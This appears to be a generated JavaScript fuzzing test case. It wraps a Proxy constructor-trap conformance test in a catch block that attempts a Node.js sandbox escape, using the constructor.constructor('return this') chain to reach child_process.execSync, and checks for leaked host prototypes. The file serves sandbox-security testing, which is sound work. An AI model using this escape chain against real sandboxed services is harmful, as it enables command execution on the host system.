try {
    var _target, _handler, _args, _P;
    function Target() {
        let REPLACER = 23;
    }
    var handler = {
        construct: function (t, args, newTarget) {
            throw () => {
                return () => {
                };
            };
            _handler = this;
            _target = t;
            _args = args;
            _P = newTarget;
            return new t(args[0], args[1]);
        }
    };
    var P = new Proxy(Target, handler);
    new P(1, 2);
    assert.sameValue(_handler, handler, 'trap context is the handler object');
    assert.sameValue(_target, Target, 'first parameter is the target object');
    assert.sameValue(_args.length, 2, 'arguments list contains all call arguments');
    assert.sameValue(_args[0], 1, 'arguments list has first call argument');
    assert.sameValue(_args[1], 2, 'arguments list has second call argument');
    assert.sameValue(_P, P, 'constructor is sent as the third parameter');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}